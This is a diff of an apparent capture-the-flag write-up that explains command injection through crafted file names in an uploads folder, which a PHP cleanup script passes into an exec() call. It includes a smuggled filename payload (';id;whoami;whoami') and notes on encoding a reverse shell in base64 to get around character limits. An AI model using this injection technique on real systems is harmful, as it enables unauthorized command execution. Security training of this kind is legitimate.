@@ -128,29 +128,26 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	1. We are able to do command injection by naming the files in `uploads` directory commands we want to execute
 		```
 		# Create our Command Injection Payload
-		touch /var/www/html/uploads/'<Command Injection Payload'
+		touch "/var/www/html/uploads/<Command Injection Payload>"
+		touch ";id;whoami;whoami"
 
 		# Our Payload is stored in $value variable
-		/var/www/html/uploads/<filename> = $value
-		$value = <Command Injection Payload>
+		$value = /var/www/html/uploads/<filename> 
+		$value = /var/www/html/uploads/;id;whoami;whoami
 
 		# What it looks like when command injected
 		exec("nohup /bin/rm -f /var/www/html/uploads$value > /dev/null 2>&1
-		exec("nohup /bin/rm -f /var/www/html/uploads<Command Injection Payload> > /dev/null 2>&1
+		exec("nohup /bin/rm -f /var/www/html/uploads;id;whoami;whoami > /dev/null 2>&1
 		```
-	4. Creating the payload (1)
+	4. Create payload
 		> 1. Commands we would want to inject will be a reverse shell, most reverse shell requires the character `/`, however, it is not possible to create a file w/ `/` in its filename.
 		> 2. Bypass/Overcome the restriction 
 			> - We can `base64` encode the payload and then decode it pip it in `sh`
 			> - Use `$(which bash)`
-		{: .prompt-info }
-
-	5. Creating the payload (2)
-		> 1. Our command injection payload is directed into `/dev/null`, 
-		> 2. Bypass/Overcome the restriction 
+		> 3. Our command injection payload is directed into `/dev/null`, 
+		> 4. Bypass/Overcome the restriction 
 			> - simply add a random command (`;id`) so that that command will be passed to `/dev/null` instead.
-		{: .prompt-info }
-		
+
 3. Exploiting `check_attack.php`
 	1. Monitor when `check_attack.php` is executed w/ `pspy64`
 	2. Create our command injection file (1)
